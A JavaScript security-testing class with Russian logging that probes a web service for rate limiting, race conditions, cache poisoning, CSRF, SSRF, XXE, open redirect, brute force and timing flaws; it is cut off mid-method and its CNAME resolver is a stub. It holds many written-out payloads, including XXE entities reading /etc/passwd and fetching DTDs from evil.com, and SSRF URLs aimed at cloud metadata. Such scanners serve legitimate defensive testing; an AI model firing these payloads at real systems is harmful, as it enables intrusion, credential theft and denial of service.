// security-tests.js (расширенная версия)

export class SecurityTests {
    constructor(requester, options = {}) {
        this.requester = requester;
        this.concurrency = options.concurrency || 10;
        this.delayBetweenRequests = options.delayBetweenRequests || 0;
        this.timeout = options.timeout || 30000;
        this.baseURL = options.baseURL || '';
        this.results = [];
    }

    // ========== 1. RATE LIMIT TESTS ==========
    async testRateLimit(endpoint, requestsCount = 100, concurrency = 20) {
        console.log(`\n🚦 ТЕСТИРОВАНИЕ RATE LIMITING (${requestsCount} запросов, конкурентность ${concurrency})`);
        
        const startTime = Date.now();
        const results = [];
        const chunks = [];
        
        for (let i = 0; i < requestsCount; i += concurrency) {
            chunks.push(Array.from({ length: Math.min(concurrency, requestsCount - i) }, (_, idx) => i + idx));
        }
        
        let rateLimited = 0;
        let success = 0;
        let errors = 0;
        const statusCodes = {};
        
        for (const chunk of chunks) {
            const promises = chunk.map(async (id) => {
                const result = await this.requester.send(endpoint);
                return { id, ...result };
            });
            
            const chunkResults = await Promise.all(promises);
            for (const res of chunkResults) {
                results.push(res);
                const status = res.status || (res.error ? 0 : 200);
                statusCodes[status] = (statusCodes[status] || 0) + 1;
                
                if (status === 429 || (res.data && (res.data.error?.code === 429 || res.data.message?.includes('rate limit')))) {
                    rateLimited++;
                } else if (status >= 200 && status < 300) {
                    success++;
                } else {
                    errors++;
                }
            }
            
            await new Promise(r => setTimeout(r, this.delayBetweenRequests));
        }
        
        const duration = Date.now() - startTime;
        
        console.log(`   Успешно: ${success}`);
        console.log(`   Rate Limited: ${rateLimited}`);
        console.log(`   Ошибок: ${errors}`);
        console.log(`   Статусы: ${JSON.stringify(statusCodes)}`);
        
        const vulnerability = {
            type: 'RATE_LIMIT',
            severity: rateLimited === 0 ? 'HIGH' : (rateLimited < requestsCount * 0.1 ? 'MEDIUM' : 'LOW'),
            description: rateLimited === 0 
                ? 'Rate limiting отсутствует – возможен brute force/DoS'
                : rateLimited < requestsCount * 0.1
                ? 'Слабый rate limiting – защита сработала только на малой части запросов'
                : 'Rate limiting работает корректно',
            details: { success, rateLimited, errors, duration, statusCodes }
        };
        
        this.results.push(vulnerability);
        return vulnerability;
    }
    
    // ========== 2. RACE CONDITION TESTS ==========
    async testRaceCondition(operation, iterations = 20, concurrentRequests = 5) {
        console.log(`\n🏁 ТЕСТИРОВАНИЕ RACE CONDITION (${iterations} итераций, ${concurrentRequests} запросов)`);
        
        const raceResults = [];
        
        for (let i = 0; i < iterations; i++) {
            console.log(`   Итерация ${i + 1}/${iterations}...`);
            
            const promises = [];
            for (let j = 0; j < concurrentRequests; j++) {
                promises.push(this.requester.send(operation));
            }
            
            const results = await Promise.all(promises);
            
            const uniqueResponses = new Set();
            for (const res of results) {
                const signature = JSON.stringify(res.data || res.error);
                uniqueResponses.add(signature);
            }
            
            const hasRace = uniqueResponses.size > 1;
            if (hasRace) {
                raceResults.push({
                    iteration: i,
                    uniqueCount: uniqueResponses.size,
                    responses: results.map(r => ({ status: r.status, data: r.data }))
                });
                console.log(`   🔴 RACE CONDITION обнаружена! Разных ответов: ${uniqueResponses.size}`);
            }
        }
        
        const vulnerability = {
            type: 'RACE_CONDITION',
            severity: raceResults.length > 0 ? 'CRITICAL' : 'LOW',
            description: raceResults.length > 0 
                ? `Обнаружено ${raceResults.length} race condition(ий) – возможны неконсистентные состояния`
                : 'Race condition не обнаружены',
            details: { totalIterations: iterations, raceCount: raceResults.length, examples: raceResults.slice(0, 3) }
        };
        
        this.results.push(vulnerability);
        return vulnerability;
    }
    
    // ========== 3. CACHE POISONING ==========
    async testCachePoisoning(endpoint, headers = {}) {
        console.log(`\n💉 ТЕСТИРОВАНИЕ CACHE POISONING`);
        
        const cacheTests = [
            { name: 'Host header injection', headers: { 'Host': 'evil.com' }, payload: 'Host: evil.com' },
            { name: 'X-Forwarded-Host injection', headers: { 'X-Forwarded-Host': 'evil.com' }, payload: 'X-Forwarded-Host: evil.com' },
            { name: 'X-Original-URL injection', headers: { 'X-Original-URL': '/admin' }, payload: 'X-Original-URL: /admin' },
            { name: 'X-Rewrite-URL injection', headers: { 'X-Rewrite-URL': '/admin' }, payload: 'X-Rewrite-URL: /admin' },
            { name: 'X-HTTP-Method-Override', headers: { 'X-HTTP-Method-Override': 'DELETE' }, payload: 'Method override to DELETE' },
            { name: 'X-Forwarded-For injection', headers: { 'X-Forwarded-For': '127.0.0.1, evil.com' }, payload: 'X-Forwarded-For spoofing' },
            { name: 'Cache-Control: no-store bypass', headers: { 'Cache-Control': 'no-store, max-age=0' }, payload: 'Cache bypass' },
            { name: 'X-Cache-Key injection', headers: { 'X-Cache-Key': 'poisoned' }, payload: 'Cache key manipulation' },
            { name: 'Path normalization', path: '/../admin', payload: 'Path traversal in cache key' },
            { name: 'Param pollution', params: { 'admin': 'true', 'admin': 'false' }, payload: 'Parameter pollution' }
        ];
        
        const results = [];
        
        for (const test of cacheTests) {
            console.log(`   Тест: ${test.name}`);
            
            let testEndpoint = typeof endpoint === 'string' ? endpoint : endpoint.path || '/';
            if (test.path) testEndpoint = test.path;
            
            const req = {
                ...(typeof endpoint === 'object' ? endpoint : { path: testEndpoint }),
                headers: { ...(typeof endpoint === 'object' ? endpoint.headers : {}), ...test.headers }
            };
            
            if (test.params) req.params = test.params;
            
            const result = await this.requester.send(req);
            
            // Проверяем кэширующие заголовки
            const cacheHeaders = result.headers || {};
            const cacheable = cacheHeaders['cache-control']?.includes('public') ||
                            cacheHeaders['cache-control']?.includes('max-age') ||
                            cacheHeaders['x-cache'] === 'HIT';
            
            const vulnerable = cacheable && result.status === 200;
            
            results.push({
                test: test.name,
                vulnerable,
                status: result.status,
                cacheHeaders: {
                    'cache-control': cacheHeaders['cache-control'],
                    'x-cache': cacheHeaders['x-cache'],
                    'pragma': cacheHeaders['pragma']
                }
            });
            
            console.log(`   ${vulnerable ? '🔴 УЯЗВИМО' : '✓ Безопасно'} (статус ${result.status})`);
            
            await new Promise(r => setTimeout(r, 100));
        }
        
        const vulnerability = {
            type: 'CACHE_POISONING',
            severity: results.some(r => r.vulnerable) ? 'HIGH' : 'LOW',
            description: results.some(r => r.vulnerable) 
                ? 'Обнаружены уязвимости к cache poisoning – злоумышленник может отравить кэш'
                : 'Cache poisoning не обнаружено',
            details: results
        };
        
        this.results.push(vulnerability);
        return vulnerability;
    }
    
    // ========== 4. CACHE DECEPTION ==========
    async testCacheDeception(endpoint) {
        console.log(`\n🎭 ТЕСТИРОВАНИЕ CACHE DECEPTION`);
        
        const deceptionPayloads = [
            { suffix: '/%2e%2e/%2e%2e/', desc: 'Double URL encoding' },
            { suffix: '/..;/..;/', desc: 'Path traversal with semicolon' },
            { suffix: '/..%252f..%252f', desc: 'Double encoding' },
            { suffix: '/%252e%252e/%252e%252e/', desc: 'UTF-8 encoding' },
            { suffix: '/..%c0%af..%c0%af', desc: 'Overlong UTF-8' },
            { suffix: '/.//.//', desc: 'Multiple slashes' },
            { suffix: '/;', desc: 'Semicolon suffix' },
            { suffix: '/%3B', desc: 'URL encoded semicolon' },
            { suffix: '/./././', desc: 'Current directory repetition' },
            { suffix: '?x=../', desc: 'Query param traversal' },
            { suffix: '#../', desc: 'Fragment traversal' },
            { suffix: '/anything.css', desc: 'Static file extension' },
            { suffix: '/anything.jpg', desc: 'Image extension' },
            { suffix: '/anything.js', desc: 'JS extension' },
            { suffix: '/%0a', desc: 'Newline injection' },
            { suffix: '/%0d', desc: 'CR injection' }
        ];
        
        const results = [];
        
        for (const payload of deceptionPayloads) {
            console.log(`   Тест: ${payload.desc} (${payload.suffix})`);
            
            const testEndpoint = (typeof endpoint === 'string' ? endpoint : endpoint.path || '/') + payload.suffix;
            const req = typeof endpoint === 'string' ? testEndpoint : { ...endpoint, path: testEndpoint };
            
            const result = await this.requester.send(req);
            
            // Проверяем, закэшировался ли приватный контент
            const cacheHeaders = result.headers || {};
            const isCached = cacheHeaders['x-cache'] === 'HIT' || 
                            cacheHeaders['cf-cache-status'] === 'HIT' ||
                            cacheHeaders['x-cache-status'] === 'HIT';
            
            const isSensitive = result.status === 200 && (
                (result.data && (JSON.stringify(result.data).includes('password') || 
                                 JSON.stringify(result.data).includes('token') ||
                                 JSON.stringify(result.data).includes('email'))) ||
                result.status === 200
            );
            
            const vulnerable = isCached && isSensitive;
            
            results.push({
                payload: payload.desc,
                suffix: payload.suffix,
                vulnerable,
                status: result.status,
                isCached,
                contentLength: JSON.stringify(result.data || '').length
            });
            
            console.log(`   ${vulnerable ? '🔴 УЯЗВИМО (приватный контент закэширован)' : '✓ Безопасно'}`);
            
            await new Promise(r => setTimeout(r, 100));
        }
        
        const vulnerability = {
            type: 'CACHE_DECEPTION',
            severity: results.some(r => r.vulnerable) ? 'HIGH' : 'LOW',
            description: results.some(r => r.vulnerable) 
                ? 'Обнаружены уязвимости к cache deception – приватные данные могут быть закэшированы'
                : 'Cache deception не обнаружено',
            details: results.filter(r => r.vulnerable).slice(0, 5)
        };
        
        this.results.push(vulnerability);
        return vulnerability;
    }
    
    // ========== 5. SESSION FIXATION ==========
    async testSessionFixation(loginEndpoint, protectedEndpoint, testSessionId) {
        console.log(`\n🔑 ТЕСТИРОВАНИЕ SESSION FIXATION`);
        
        const tests = [
            { name: 'Установка своей сессии до логина', sessionId: testSessionId || 'evil_session_12345' },
            { name: 'Session ID в URL', sessionId: testSessionId || 'evil_session_12345', inUrl: true },
            { name: 'Пустая сессия', sessionId: '' },
            { name: 'Очень длинная сессия', sessionId: 'A'.repeat(1000) },
            { name: 'Спецсимволы в сессии', sessionId: '<script>alert(1)</script>' },
            { name: 'Path traversal в сессии', sessionId: '../../../../etc/passwd' }
        ];
        
        const results = [];
        
        for (const test of tests) {
            console.log(`   Тест: ${test.name}`);
            
            // Устанавливаем сессию до логина
            const initialReq = {
                ...protectedEndpoint,
                headers: {
                    Cookie: `sessionid=${test.sessionId}`
                }
            };
            
            if (test.inUrl) {
                initialReq.path = `${protectedEndpoint.path || '/'}?sessionid=${test.sessionId}`;
            }
            
            // Пытаемся получить доступ до логина
            const beforeLogin = await this.requester.send(initialReq);
            
            // Логинимся
            const loginReq = {
                ...loginEndpoint,
                headers: {
                    Cookie: `sessionid=${test.sessionId}`
                }
            };
            await this.requester.send(loginReq);
            
            // Пытаемся получить доступ после логина с той же сессией
            const afterLogin = await this.requester.send(initialReq);
            
            const vulnerable = beforeLogin.status === 401 && afterLogin.status === 200;
            
            results.push({
                test: test.name,
                vulnerable,
                beforeLoginStatus: beforeLogin.status,
                afterLoginStatus: afterLogin.status
            });
            
            console.log(`   ${vulnerable ? '🔴 УЯЗВИМО (сессия не регенерируется)' : '✓ Безопасно'}`);
            
            // Сброс сессии
            await this.requester.send({ ...loginEndpoint, method: 'POST', body: { logout: true } });
        }
        
        const vulnerability = {
            type: 'SESSION_FIXATION',
            severity: results.some(r => r.vulnerable) ? 'HIGH' : 'LOW',
            description: results.some(r => r.vulnerable) 
                ? 'Обнаружена session fixation – сервер не регенерирует ID сессии после логина'
                : 'Session fixation не обнаружено',
            details: results
        };
        
        this.results.push(vulnerability);
        return vulnerability;
    }
    
    // ========== 6. CSRF (Cross-Site Request Forgery) ==========
    async testCSRF(endpoint, options = {}) {
        console.log(`\n🔄 ТЕСТИРОВАНИЕ CSRF ЗАЩИТЫ`);
        
        const csrfTests = [
            { name: 'Отсутствие CSRF токена', headers: {}, body: options.defaultBody || {} },
            { name: 'Неверный CSRF токен', headers: { 'X-CSRF-Token': 'invalid_token' }, body: options.defaultBody || {} },
            { name: 'Пустой CSRF токен', headers: { 'X-CSRF-Token': '' }, body: options.defaultBody || {} },
            { name: 'CSRF токен в GET параметре', params: { csrf_token: 'invalid' }, body: options.defaultBody || {} },
            { name: 'CSRF токен в POST параметре', body: { csrf_token: 'invalid', ...(options.defaultBody || {}) } },
            { name: 'Разные Content-Type', headers: { 'Content-Type': 'text/plain' }, body: JSON.stringify(options.defaultBody || {}) },
            { name: 'CORS misconfiguration', headers: { 'Origin': 'https://evil.com' }, body: options.defaultBody || {} },
            { name: 'Referer spoofing', headers: { 'Referer': 'https://evil.com' }, body: options.defaultBody || {} },
            { name: 'SameSite=None без Secure', headers: { 'Cookie': 'session=value; SameSite=None' }, body: options.defaultBody || {} }
        ];
        
        const results = [];
        
        for (const test of csrfTests) {
            console.log(`   Тест: ${test.name}`);
            
            const req = {
                ...(typeof endpoint === 'object' ? endpoint : { path: endpoint }),
                method: 'POST',
                headers: test.headers,
                body: test.body
            };
            
            if (test.params) req.params = test.params;
            
            const result = await this.requester.send(req);
            
            // Проверяем, не принял ли сервер запрос без валидного CSRF токена
            const vulnerable = result.status === 200 && !result.data?.error?.includes('csrf');
            
            results.push({
                test: test.name,
                vulnerable,
                status: result.status,
                headers: result.headers
            });
            
            console.log(`   ${vulnerable ? '🔴 УЯЗВИМО (запрос принят без CSRF защиты)' : '✓ Безопасно'}`);
            
            await new Promise(r => setTimeout(r, 100));
        }
        
        // Проверка SameSite cookies
        console.log(`\n   Доп. тест: SameSite cookie атрибуты`);
        const cookieCheck = await this.requester.send(endpoint);
        const setCookies = cookieCheck.headers?.['set-cookie'] || [];
        const sameSiteMissing = setCookies.some(c => !c.toLowerCase().includes('samesite'));
        const laxOrStrict = setCookies.some(c => c.toLowerCase().includes('samesite=lax') || c.toLowerCase().includes('samesite=strict'));
        
        console.log(`   SameSite атрибуты: ${sameSiteMissing ? '🔴 Отсутствуют' : laxOrStrict ? '✓ Присутствуют (Lax/Strict)' : '⚠️ SameSite=None'}`);
        
        const vulnerability = {
            type: 'CSRF',
            severity: results.some(r => r.vulnerable) || sameSiteMissing ? 'HIGH' : 'MEDIUM',
            description: results.some(r => r.vulnerable)
                ? 'CSRF защита отсутствует или некорректна'
                : sameSiteMissing
                ? 'SameSite cookie атрибуты отсутствуют – частичная защита'
                : 'CSRF защита работает корректно',
            details: { tests: results, sameSiteMissing, laxOrStrict }
        };
        
        this.results.push(vulnerability);
        return vulnerability;
    }
    
    // ========== 7. SSRF (Server-Side Request Forgery) ==========
    async testSSRF(endpoint) {
        console.log(`\n🌐 ТЕСТИРОВАНИЕ SSRF УЯЗВИМОСТЕЙ`);
        
        const ssrfPayloads = [
            { name: 'Localhost IPv4', payload: 'http://127.0.0.1:80/admin' },
            { name: 'Localhost (0.0.0.0)', payload: 'http://0.0.0.0:80/admin' },
            { name: 'Localhost IPv6', payload: 'http://[::1]:80/admin' },
            { name: 'Localhost (localhost)', payload: 'http://localhost:80/admin' },
            { name: 'Internal IP (AWS metadata)', payload: 'http://169.254.169.254/latest/meta-data/' },
            { name: 'Internal IP (GCP metadata)', payload: 'http://metadata.google.internal/computeMetadata/v1/' },
            { name: 'Internal IP (Azure metadata)', payload: 'http://169.254.169.254/metadata/instance' },
            { name: 'Internal IP (Docker)', payload: 'http://172.17.0.1:2375/version' },
            { name: 'Internal IP (K8s)', payload: 'http://10.96.0.1:443/version' },
            { name: 'File protocol', payload: 'file:///etc/passwd' },
            { name: 'File protocol (Windows)', payload: 'file:///C:/Windows/win.ini' },
            { name: 'DNS rebinding', payload: 'http://127.0.0.1.nip.io:80/admin' },
            { name: 'URL encoding', payload: 'http://%31%32%37%2e%30%2e%30%2e%31:80/admin' },
            { name: 'Double encoding', payload: 'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531/admin' },
            { name: 'IPv4 octal', payload: 'http://0177.0.0.1:80/admin' },
            { name: 'IPv4 hex', payload: 'http://0x7f.0x0.0x0.0x1:80/admin' },
            { name: 'IPv4 decimal', payload: 'http://2130706433:80/admin' },
            { name: 'Redirect to localhost', payload: 'http://evil.com/redirect?url=http://127.0.0.1/admin' },
            { name: 'Port scanning (80)', payload: 'http://127.0.0.1:80' },
            { name: 'Port scanning (8080)', payload: 'http://127.0.0.1:8080' },
            { name: 'Port scanning (443)', payload: 'https://127.0.0.1:443' },
            { name: 'Gopher protocol', payload: 'gopher://127.0.0.1:8080/_GET%20/admin%20HTTP/1.0%0A%0A' },
            { name: 'Dict protocol', payload: 'dict://127.0.0.1:11211/info' },
            { name: 'SMB protocol', payload: 'smb://localhost/share' },
            { name: 'FTP protocol', payload: 'ftp://127.0.0.1:21' },
            { name: 'HTTP with CRLF injection', payload: 'http://127.0.0.1/admin%0d%0aHost: evil.com' }
        ];
        
        const results = [];
        
        for (const test of ssrfPayloads) {
            console.log(`   Тест: ${test.name} (${test.payload.substring(0, 60)}...)`);
            
            const req = {
                ...(typeof endpoint === 'object' ? endpoint : { path: endpoint }),
                body: { url: test.payload, ...(typeof endpoint === 'object' ? endpoint.body : {}) }
            };
            
            const result = await this.requester.send(req);
            
            // Признаки успешного SSRF
            const responseStr = JSON.stringify(result.data || '').toLowerCase();
            const ssrfSuccess = 
                responseStr.includes('root:') ||
                responseStr.includes('windows') ||
                responseStr.includes('instance-id') ||
                responseStr.includes('security-credentials') ||
                responseStr.includes('127.0.0.1') ||
                (result.status === 200 && responseStr.length > 100);
            
            if (ssrfSuccess) {
                results.push({
                    test: test.name,
                    payload: test.payload,
                    status: result.status,
                    responseSample: responseStr.substring(0, 200)
                });
                console.log(`   🔴 SSRF УСПЕШЕН! Получен ответ от внутреннего ресурса`);
            } else {
                console.log(`   ✓ SSRF не удался (статус ${result.status})`);
            }
            
            await new Promise(r => setTimeout(r, 200));
        }
        
        const vulnerability = {
            type: 'SSRF',
            severity: results.length > 0 ? 'CRITICAL' : 'LOW',
            description: results.length > 0 
                ? `Обнаружен SSRF: ${results.length} успешных атак на внутренние ресурсы`
                : 'SSRF не обнаружено',
            details: results
        };
        
        this.results.push(vulnerability);
        return vulnerability;
    }
    
    // ========== 8. XXE (XML External Entity) ==========
    async testXXE(endpoint) {
        console.log(`\n📄 ТЕСТИРОВАНИЕ XXE УЯЗВИМОСТЕЙ`);
        
        const xxePayloads = [
            {
                name: 'Basic XXE',
                payload: `<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>`
            },
            {
                name: 'XXE with parameter entity',
                payload: `<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY % param SYSTEM "file:///etc/passwd"><!ENTITY xxe "%param;">]>
<root>&xxe;</root>`
            },
            {
                name: 'XXE (Windows)',
                payload: `<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>&xxe;</root>`
            },
            {
                name: 'XXE with external DTD',
                payload: `<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "http://evil.com/xxe.dtd">
<root>&xxe;</root>`
            },
            {
                name: 'XXE (Base64 encoded)',
                payload: `<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"><!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">%dtd;]>
<root></root>`
            },
            {
                name: 'Blind XXE',
                payload: `<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/xxe">%remote;]>
<root/>`
            },
            {
                name: 'XXE with SSRF',
                payload: `<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>`
            },
            {
                name: 'XXE in SVG',
                payload: `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<text x="10" y="20">&xxe;</text></svg>`
            },
            {
                name: 'XXE in SOAP',
                payload: `<soap:Body>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo></soap:Body>`
            },
            {
                name: 'XXE with XInclude',
                payload: `<root xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include href="file:///etc/passwd" parse="text"/></root>`
            }
        ];
        
        const results = [];
        
        for (const test of xxePayloads) {
            console.log(`   Тест: ${test.name}`);
            
            const req = {
                ...(typeof endpoint === 'object' ? endpoint : { path: endpoint }),
                headers: { 'Content-Type': 'application/xml', ...(typeof endpoint === 'object' ? endpoint.headers : {}) },
                body: test.payload
            };
            
            const result = await this.requester.send(req);
            
            const responseStr = JSON.stringify(result.data || result.error || '').toLowerCase();
            const xxeSuccess = 
                responseStr.includes('root:') ||
                responseStr.includes('windows') ||
                responseStr.includes('[extensions]') ||
                responseStr.includes('xml') ||
                (responseStr.includes('file://') && result.status === 200);
            
            if (xxeSuccess) {
                results.push({
                    test: test.name,
                    status: result.status,
                    responseSample: responseStr.substring(0, 300)
                });
                console.log(`   🔴 XXE УСПЕШЕН! Прочитаны локальные файлы`);
            } else {
                console.log(`   ✓ XXE не удался (статус ${result.status})`);
            }
            
            await new Promise(r => setTimeout(r, 100));
        }
        
        const vulnerability = {
            type: 'XXE',
            severity: results.length > 0 ? 'CRITICAL' : 'LOW',
            description: results.length > 0 
                ? `Обнаружен XXE: ${results.length} успешных атак`
                : 'XXE не обнаружено',
            details: results
        };
        
        this.results.push(vulnerability);
        return vulnerability;
    }
    
    // ========== 9. OPEN REDIRECT ==========
    async testOpenRedirect(endpoint) {
        console.log(`\n↪️ ТЕСТИРОВАНИЕ OPEN REDIRECT`);
        
        const redirectPayloads = [
            { name: 'Basic URL', payload: 'https://evil.com' },
            { name: 'Path traversal', payload: '//evil.com' },
            { name: 'Double slash', payload: '//evil.com/@' },
            { name: 'Backslash', payload: '\\\\evil.com' },
            { name: 'URL encoded', payload: 'https%3A%2F%2Fevil.com' },
            { name: 'Double encoded', payload: 'https%253A%252F%252Fevil.com' },
            { name: 'Unicode encoded', payload: 'https://evil.com/%2e%2e' },
            { name: 'Data URL', payload: 'data:text/html,<script>alert(1)</script>' },
            { name: 'Javascript URL', payload: 'javascript:alert(1)' },
            { name: 'VBscript URL', payload: 'vbscript:msgbox(1)' },
            { name: 'Relative path', payload: '../../evil.com' },
            { name: 'With @ symbol', payload: 'https://evil.com@legit.com' },
            { name: 'With # symbol', payload: 'https://evil.com#@legit.com' },
            { name: 'With ? symbol', payload: 'https://evil.com?@legit.com' },
            { name: 'Newline injection', payload: 'https://evil.com%0a@legit.com' },
            { name: 'Tab injection', payload: 'https://evil.com%09@legit.com' },
            { name: 'CRLF injection', payload: 'https://evil.com%0d%0aLocation: https://legit.com' },
            { name: 'UTF-8 bypass', payload: 'https://evil.com/𝒆𝒗𝒊𝒍.com' },
            { name: 'IDN homograph', payload: 'https://еvіl.com' }, // Cyrillic 'e' and 'i'
            { name: 'Null byte', payload: 'https://evil.com%00@legit.com' },
            { name: 'Square brackets', payload: 'https://[evil.com]' }
        ];
        
        const results = [];
        
        for (const test of redirectPayloads) {
            console.log(`   Тест: ${test.name} (${test.payload.substring(0, 50)}...)`);
            
            const req = {
                ...(typeof endpoint === 'object' ? endpoint : { path: endpoint }),
                params: { redirect: test.payload, url: test.payload, next: test.payload, return_to: test.payload },
                body: { redirect_url: test.payload, callback: test.payload }
            };
            
            const result = await this.requester.send(req);
            
            // Проверяем редирект на внешний домен
            const location = result.headers?.location || '';
            const isRedirect = result.status === 301 || result.status === 302 || result.status === 303 || result.status === 307;
            const redirectsToExternal = isRedirect && 
                (location.includes('evil.com') || location.includes('javascript:') || location.includes('data:'));
            
            if (redirectsToExternal) {
                results.push({
                    test: test.name,
                    payload: test.payload,
                    location,
                    status: result.status
                });
                console.log(`   🔴 OPEN REDIRECT УСПЕШЕН! Редирект на: ${location.substring(0, 100)}`);
            } else {
                console.log(`   ✓ Редирект защищен (${result.status})`);
            }
            
            await new Promise(r => setTimeout(r, 100));
        }
        
        const vulnerability = {
            type: 'OPEN_REDIRECT',
            severity: results.length > 0 ? 'MEDIUM' : 'LOW',
            description: results.length > 0 
                ? `Обнаружен open redirect: ${results.length} успешных редиректов`
                : 'Open redirect не обнаружено',
            details: results
        };
        
        this.results.push(vulnerability);
        return vulnerability;
    }
    
    // ========== 10. SUBDOMAIN TAKEOVER ==========
    async testSubdomainTakeover(subdomains, cnameTargets = []) {
        console.log(`\n🏠 ТЕСТИРОВАНИЕ SUBDOMAIN TAKEOVER (${subdomains.length} поддоменов)`);
        
        const results = [];
        
        for (const subdomain of subdomains) {
            console.log(`   Проверка: ${subdomain}`);
            
            try {
                // Проверяем CNAME записи
                const cnameResult = await this.resolveCNAME(subdomain);
                
                if (cnameResult && !this.isCNAMEResolved(cnameResult)) {
                    const isVulnerable = cnameTargets.some(target => 
                        cnameResult.includes(target) || 
                        this.isDeadService(cnameResult)
                    );
                    
                    if (isVulnerable) {
                        results.push({
                            subdomain,
                            cname: cnameResult,
                            vulnerable: true,
                            service: this.detectService(cnameResult)
                        });
                        console.log(`   🔴 УЯЗВИМО! CNAME ведет на неиспользуемый сервис: ${cnameResult}`);
                    } else {
                        console.log(`   ✓ CNAME существует: ${cnameResult}`);
                    }
                } else {
                    console.log(`   ✓ Нет CNAME или A запись`);
                }
            } catch (error) {
                console.log(`   ⚠️ Ошибка проверки: ${error.message}`);
            }
            
            await new Promise(r => setTimeout(r, 100));
        }
        
        const vulnerability = {
            type: 'SUBDOMAIN_TAKEOVER',
            severity: results.some(r => r.vulnerable) ? 'CRITICAL' : 'LOW',
            description: results.some(r => r.vulnerable) 
                ? `Обнаружены уязвимые поддомены: ${results.filter(r => r.vulnerable).map(r => r.subdomain).join(', ')}`
                : 'Subdomain takeover не обнаружено',
            details: results
        };
        
        this.results.push(vulnerability);
        return vulnerability;
    }
    
    async resolveCNAME(domain) {
        // В Node.js можно использовать 'dns' модуль
        // Здесь упрощенная версия
        return null; // Заглушка
    }
    
    isCNAMEResolved(cname) {
        return cname && !cname.includes('dangling') && !cname.includes('unavailable');
    }
    
    isDeadService(cname) {
        const deadPatterns = [
            's3-website', 's3.amazonaws.com',
            'cloudfront.net', 'elb.amazonaws.com',
            'azurewebsites.net', 'cloudapp.net',
            'herokuapp.com', 'herokussl.com',
            'github.io', 'pages.github.com',
            'surge.sh', 'netlify.com',
            'vercel.app', 'now.sh',
            'readme.io', 'helpscoutdocs.com',
            'deskgap.com', 'zendesk.com',
            'freshdesk.com', 'helpjuice.com'
        ];
        return deadPatterns.some(p => cname.includes(p));
    }
    
    detectService(cname) {
        if (cname.includes('s3')) return 'AWS S3';
        if (cname.includes('cloudfront')) return 'AWS CloudFront';
        if (cname.includes('azure')) return 'Azure';
        if (cname.includes('heroku')) return 'Heroku';
        if (cname.includes('github')) return 'GitHub Pages';
        return 'Unknown';
    }
    
    // ========== 11. BRUTE FORCE ==========
    async testBruteForce(endpoint, credentialsList, fieldName = 'password', delayMs = 100) {
        console.log(`\n🔓 ТЕСТИРОВАНИЕ ЗАЩИТЫ ОТ BRUTE FORCE (${credentialsList.length} попыток)`);
        
        const results = [];
        let successes = 0;
        let rateLimited = 0;
        
        for (let i = 0; i < credentialsList.length; i++) {
            const cred = credentialsList[i];
            const payload = typeof endpoint === 'function' ? endpoint(cred) : { ...endpoint, [fieldName]: cred };
            
            const result = await this.requester.send(payload);
            results.push({ attempt: i + 1, credential: cred, status: result.status, success: result.status === 200 });
            
            if (result.status === 200) successes++;
            if (result.status === 429 || (result.data && result.data.error?.code === 429)) rateLimited++;
            
            if ((i + 1) % 10 === 0) {
                console.log(`   Прогресс: ${i + 1}/${credentialsList.length}`);
            }
            
            await new Promise(r => setTimeout(r, delayMs));
        }
        
        console.log(`   Успешных входов: ${successes}`);
        console.log(`   Rate limit сработал: ${rateLimited} раз`);
        
        const vulnerability = {
            type: 'BRUTE_FORCE',
            severity: successes > 0 ? 'CRITICAL' : (rateLimited === 0 ? 'HIGH' : 'MEDIUM'),
            description: successes > 0 
                ? `Найдено ${successes} валидных учетных данных – защита от brute force отсутствует`
                : rateLimited === 0
                ? 'Нет rate limiting – возможен медленный перебор'
                : 'Rate limiting присутствует, но возможен перебор с низкой скоростью',
            details: { totalAttempts: credentialsList.length, successes, rateLimited }
        };
        
        this.results.push(vulnerability);
        return vulnerability;
    }
    
    // ========== 12. TIMING ATTACKS ==========
    async testTimingAttack(operations, samples = 50) {
        console.log(`\n⏱️ ТЕСТИРОВАНИЕ TIMING ATTACK (${operations.length} операций, ${samples} замеров)`);
        
        const timings = {};
        
        for (const op of operations) {
            const durations = [];
            
            for (let i = 0; i < samples; i++) {
                const start = Date.now();
                await this.requester.send(op);
                const duration = Date.now() - start;
                durations.push(duration);
                await new Promise(r => setTimeout(r, 10));
            }
            
            const avg = durations.reduce((a, b) => a + b, 0) / durations.length;
            const min = Math.min(...durations);
            const max = Math.max(...durations);
            const variance = durations.map(d => Math.pow(d - avg, 2)).reduce((a, b) => a + b, 0) / durations.length;
            const stdDev = Math.sqrt(variance);
            
            timings[JSON.stringify(op)] = { avg, min, max, stdDev, samples: durations };
            console.log(`   ${JSON.stringify(op).substring(0, 50)}: avg=${avg.toFixed(2)}ms, stdDev=${stdDev.toFixed(2)}`);
        }
        
        const timingDifferences = [];
        const keys = Object.keys(timings);
        for (let i = 0; i < keys.length; i++) {
            for (let j = i + 1; j < keys.length; j++) {
                const diff = Math.abs(timings[keys[i]].avg - timings[keys[j]].avg);
                if (diff > 20) {
                    timingDifferences.push({ op1: keys[i], op2: keys[j], diff });
                }
            }
        }
        
        const vulnerability = {
            type: 'TIMING_ATTACK',
            severity: timingDifferences.length > 0 ? 'MEDIUM' : 'LOW',
            description: timingDifferences.length > 0 
                ? 'Обнаружены значимые различия во времени ответа – возможен timing attack'
                : 'Время ответа стабильно – timing attack маловероятен',
            details: { timings, significantDifferences: timingDifferences }
        };
        
        this.results.push(vulnerability);
        return vulnerability;
    }
    
    // ========== 13. RESOURCE EXHAUSTION / DOS ==========
    async testResourceExhaustion(payloadGenerator, iterations = 100, concurrency = 20) {
